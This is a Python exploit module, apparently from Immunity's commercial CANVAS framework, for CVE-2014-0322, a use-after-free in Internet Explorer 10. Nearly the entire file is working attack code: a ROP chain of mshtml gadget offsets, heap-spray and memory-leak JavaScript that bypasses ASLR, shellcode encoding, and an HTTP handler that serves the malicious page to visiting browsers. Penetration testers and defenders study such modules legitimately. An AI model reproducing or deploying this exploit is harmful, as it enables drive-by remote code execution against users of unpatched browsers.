#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2009
# http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement
import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside
from libs.spkproxy import header, body


NAME                            = "ie_cmarkup"
DESCRIPTION                     = "Use-after-free bug for internet explorer 10. CMarkup Object used after freed allows us to inc an arbitrary address"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Microsoft"
DOCUMENTATION["Repeatability"]  = "Single"
DOCUMENTATION["References"]     = "URL:http://technet.microsoft.com/security/bulletin/MS14-012"
DOCUMENTATION["CVE Name"]       = "CVE-2014-0322"
DOCUMENTATION["CVE Url"]        = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0322"
DOCUMENTATION["NOTES"]          = """
 - This exploits leaks a vtable pointer of a mshtml object in order to bypass ASLR
 - We also leak the shellcode's address so there's no need for spraying the shellcode

This exploit has been tested on:
- Windows 7 Professional (x86) SP 1 on IE 10
- Windows 7 Enterprise (x86) SP 1 on IE 10

The following mshtml versions are vulnerables and has been tested:
- 10.00.9200.16521
"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["Windows"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version        = 0
        self.name           = NAME
        self.badstring      = '\x00'
        # filename is used in the actual http server
        self.filename       = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + "00.html"
        
    def is_vulnerable(self, info_dict):
        if "MSIE 10.0" in info_dict['user_agent']:
            return 100
        else:
            self.log("Not IE 10 - possibly vulnerable, but not to this exploit or the current version of this exploit")
            return 0

    def createAndEncodeShellcode(self):
        self.createWin32ClientSideShellcode()
        self.shellcode = self.intel_encode(self.badstring, self.shellcode)
        
    def urlencode(self, buf):
        tmp = ""
        i = 0
        if len(buf) % 2 == 0:
            for c in buf:
                if i == 1:
                    b = ord(c)
                    tmp+="%%u%2.2x%2.2x"%(b,a)
                    i = 0
                else:
                    a = ord(c)
                    i += 1 
            return tmp
        else:
            for c in buf[:-1]:
                if i == 1:
                    b = ord(c)
                    tmp+="%%u%2.2x%2.2x"%(b,a)
                    i = 0
                else:
                    a = ord(c)
                    i += 1 
            tmp += "%%u%2.2x"%(ord(buf[-1]))
            return tmp
        
    def get_rop(self):
        rop = """
              mshtml_base = mshtmlAddress - 0x51e34;
              virtual_protect = mshtml_base + 0x00c6d3a8;
              ret_address = mshtml_base + 0x1011;
              push_edx_pop_esp = mshtml_base + 0x0097a658; // push edx # pop esp # pop esi # pop ebp # ret 0x14
              
              pop_ebp = mshtml_base + 0x006ddf11;
              pop_ebx = mshtml_base + 0x00153d06;
              pop_edx = mshtml_base + 0x003876bd;
              pop_ecx = mshtml_base + 0x001c1948;
              pop_edi = mshtml_base + 0x0023a9bb;
              pop_esi = mshtml_base + 0x0037a982;
              jmp_eax = mshtml_base + 0x000424dc;
              pop_eax = mshtml_base + 0x004a5623;
              pushad = mshtml_base + 0x0006a246;
              jmp_esp = mshtml_base + 0x0010c294;
              writeable_addr = mshtml_base + 0x00c7329d;
              xchg_eax_ebx = mshtml_base + 0x001af7e3;
              neg_eax = mshtml_base + 0x0005ebaf;
              xchg_eax_edx = mshtml_base + 0x000d111b;
              mov_eax_eaxPtr = mshtml_base + 0x00074791;
              xchg_eax_esi = mshtml_base + 0x002c7a63;
              
              rop = myescape(ret_address);
              
              rop += myescape(ret_address);
              rop += myescape(ret_address);
              rop += myescape(ret_address);
              rop += myescape(ret_address);
              rop += myescape(ret_address);
              rop += myescape(ret_address);
              rop += myescape(ret_address);
              rop += myescape(ret_address);
              rop += myescape(ret_address);
              rop += myescape(ret_address);
              
              rop += myescape(pop_ebp);
              rop += myescape(jmp_esp);
              rop += myescape(pop_eax);
              rop += myescape(0xfffffdff);
              rop += myescape(neg_eax);
              rop += myescape(xchg_eax_ebx);
              rop += myescape(pop_eax);
              rop += myescape(0xffffffc0);
              rop += myescape(neg_eax);
              rop += myescape(xchg_eax_edx);
              rop += myescape(pop_ecx);
              rop += myescape(writeable_addr);
              rop += myescape(pop_edi);
              rop += myescape(ret_address);
              rop += myescape(pop_eax);
              rop += myescape(virtual_protect);
              rop += myescape(mov_eax_eaxPtr);
              rop += myescape(xchg_eax_esi);
              rop += myescape(pop_eax);
              rop += myescape(0x90909090);
              rop += myescape(pushad);
              
              rop += myescape(0x909006eb); // jmp short
              
              //stack pivot
              rop += myescape(push_edx_pop_esp);
        """
        return rop
        
    def generate_html(self):
        html = """
        <html>
        <body>
        <script id="the_script">
            var a = 0;
        </script>
        <script>
            var varbazinga = true;
            var address = 0x1d7e0019;  
            var sprayedAddr = 0x41424337; //0x28900017;

            var magic = 25001; //if the exploit doesn't work for you try selecting another number in the range 25000 -/+ 128
            var strarr = new Array();
            var arrarr = new Array();
            var sprayarr = new Array();
            var count = (0x80000-0x20)/4;
            var intArr = new Array(0x500);
            var arrLenAddr = -1;
            var left = 0;
            var right = 0;
            var array = [];
            var array2 = [];
            var Found = false;
            
            function dword2data(dword) {
                var d = Number(dword).toString(16);
                while (d.length < 8)
                    d = '0' + d;
                return unescape('%%u' + d.substr(4, 8) + '%%u' + d.substr(0, 4));
            }
            
            function myescape(addr) {
                var str="";
                str="%%u"+hexa(addr&0xffff)+"%%u"+hexa((addr>>16)&0xffff);
                return str;
            }
            
            function hexa(val) {
                var str=new Number(val).toString(16);
                while (str.length < 4)  str = "0" + str;
                return str;
            }

            function heap_spray()
            {
                for(i=0;i<0x250;i++){
                    array2[i] = document.createElement('div');
                }
                var str = dword2data(0x42424242);
                str += dword2data(0x41414141);
                str += dword2data(0x0b0b0020);
                while(str.length < 0x0c/2){
                    str += dword2data(0x43434343); 
                }
                str += dword2data(0x0b0b0020);
                while(str.length < 0x4c/2){
                    str += dword2data(0x43434343); 
                }
                str += dword2data(0x0b0b0020);
                while(str.length < 0x1c0/2){
                    str += dword2data(0x0b0b0020); 
                }
                str += dword2data(0x0b0b0020);
                while(str.length < 0x15c/2){
                    str += dword2data(0x41414141); 
                }
                str += dword2data(0x0b0b0020);
                while (str.length < 0x1000/2){
                    str += dword2data(0x41414141); 
                }
                while (str.length < 0x7ffe0){
                    str += str; 
                }
                for(i=0;i<0x250;i++){
                    array2[i].title = str.substring(0,(0x7ffe0-2)/2);
                }
            }
            
            function spray() {
                //create a bunch of String and Array objects
                for(var i=0;i<0x500;i++) {
                    intArr[i] = new Array(count);
                    for(var j=0;j<count;j++) {
                        if (j == 0){
                            intArr[i][j] = 0x80000000;
                        }
                        else{
                            intArr[i][j] = 0x11111111;
                        }
                        
                    }
                }
            }

            function start() {
                var a = document.getElementById("the_script");
                a.onpropertychange = boom ;
                var c = document.createElement('button');
                c.applyElement(a);
                c.applyElement(document.createElement("div"));
            } 
            
            function boom(){
                for(i=0;i<0x250;i++){
                    array[i]=document.createElement('div');
                }
                // Craft the buffer to avoid undesired crashes
                var buff = dword2data(0x41414141);
                while(buff.length < 0x94/2){
                    buff += dword2data(0xffffffff);
                }
                
                buff += dword2data(0x0b0b0020);
                buff += dword2data(0x0b0b0020);

                while(buff.length < 0xac/2){
                    buff += dword2data(0x41414141);
                }
                buff += dword2data(address); // address to inc
                while(buff.length < 0x15c/2){
                    buff += dword2data(0x41414141); 
                }
                buff += dword2data(0x41410041); // shifted to give 1
                while(buff.length < 0x340){
                    buff += dword2data(0x41414141);
                }
                var allocs = buff.substring(0,(0x340-2)/2);
                try{
                    this.outerHTML=this.outerHTML;
                } catch(e){}
                CollectGarbage();

                for(i=0;i<0x250;i++){
                    array[i].title = allocs.substring(0,allocs.length);
                }
                if (varbazinga){
                    window.setTimeout(function(){ bazinga()},1000);
                }
            }

        function bazinga(){
                
                for(j = 0; j < mem.length; j++) {
                for(i = 0; i < 0x7ffe ; i += 0x1000) {
                    
                    if(mem[j].getAttribute("attr" + i).length != 0x45) {
                    Found = true;
                    data = mem[j].getAttribute("attr" + i);
                    
                    mshtmlAddress = data.charCodeAt(4) + data.charCodeAt(5) * 0x10000;
                    bodyindex = data.charCodeAt(7) * 0x10000 + data.charCodeAt(6) * 0x10000;
                    bodyindex = bodyindex / 0x10000;
                    
                    %s // rop
                    
                    //shellcode = myescape(0xcccccccc);
                    
                    shellcode = unescape(rop) + unescape("%s");
                    bodies[bodyindex].setAttribute('rop', shellcode);
                    data = mem[j].getAttribute("attr" + i);
                    shellcode_address = data.charCodeAt(14) + data.charCodeAt(15) * 0x10000;
                    
                    }
                    if (Found) break;
                }
                if (Found) break;
                }
                    
            if (arrLenAddr == -1){
                address = 0x41424327; //0x28900007;
                start();

                for (i = 0 ; i < 0x500 ; i++)
                {
                    for (j = 1 ; j < count; j++)
                    {
                        if(intArr[i][j] != 0x11111111 )
                            {
                                arrLenAddr = sprayedAddr-j*4-8;
                                left = i;
                                right = j;
                                address = arrLenAddr - 0x10;
                                start();
                                break;
                            }
                    }
                    if(arrLenAddr != -1) break;
                }
            }
            else{
                intArr[left][1] = 0x22222222;
                intArr[left+2][1] =  0x22222222;

                intArr[left][count+5] = 0x3fffffff;
                intArr[left][count+6] = 0x3fffffff;

                my_array_addr = arrLenAddr - 3 + 8 + 0x80000;
                shared_index = (my_array_addr - shellcode_address) / 4;
                shared_index = 0x40000000-shared_index;
                intArr[left+1][shared_index] = (shellcode_address >> 1)-1;
                address = shellcode_address-0x10;
                varbazinga=false;
                start();
                
                intArr[left+1][count+8] = (shellcode_address >> 1)-1;
                address = my_array_addr + 0x80000 - 0x10;
                varbazinga=false;
                start();
                alert(intArr[left+1][count+8]);
            }
        }

        function heap_attr(){
            div = document.createElement("div");
            div.clearAttributes();
            for(i=0;i<0x7ffe;i++){
                div.setAttribute("attr" + i, null);
            }
            mem = new Array(400);
            
            for(i=0;i<mem.length;i++){
                mem[i] = div.cloneNode(true);
            }
            
            k=0
            bodies = new Array();
            for(j=0;j<mem.length;j++){
                for(i=0;i<0x7ffe;i+=0x1000){
                    mem[j].setAttribute("attr" + i, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
                    body_elem = document.createElement("body");
                    body_elem.title = "a";
                    body_elem.id = "a";
                    body_elem.text = "a";
                    body_elem.bgColor = k;
                    body_elem.topMargin = 1;
                    body_elem.bottomMargin = 1;
                    body_elem.leftMargin = 1;
                    body_elem.rightMargin = 4;
                    body_elem.setAttribute("rop", bodies.length);
                    bodies.push(body_elem);
                    k = k + 1;
                    //alert(body_elem);
                }
            }
            
            document.body.setAttribute("mem", mem);
            document.body.setAttribute("bodies", bodies);
            return true
        }

            heap_spray();
            heap_attr();
            spray();
            start();
            </script>
        </body> 
        </html>
        
        """
        html = html % (self.rop, self.urlencode(self.shellcode))
        return html
        
    def makesploit(self, clientheader, clientbody):
        h = header('SERVER')
        b = body()
        
        self.rop = self.get_rop()

        if clientheader.URL.endswith(self.filename):
            self.log('Serving HTML file')
            
            self.createAndEncodeShellcode()
            html = self.generate_html()
                
            b.setBody(html)
            h.addHeader('Content-Type','text/html')

        elif clientheader.URL.count("exit"):
            self.log('Max retries reached. Exploit failed.')
            h.status='302'
            h.addHeader('Location',"http://www.google.com")
            h.addHeader('Content-Type','text/html')
            return h, b

        else:
            self.log('Redirecting to self')
            h.status='302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type','text/html')

        return h, b

    def run(self):
        self.createAndEncodeShellcode()

        self.rop = self.get_rop()
        html = self.generate_html()
        self.log('Opening %s for output' % (self.filename))

        fd = file(self.filename,'wb+')
        fd.write(html)
        fd.close()
        self.log('Wrote to %s' % (self.filename))

        return 1

if __name__ == '__main__':
    exp = theexploit()
    ret = standard_callback_commandline(exp)
    if ret not in [0, 1, None]:
        ret.interact()

        
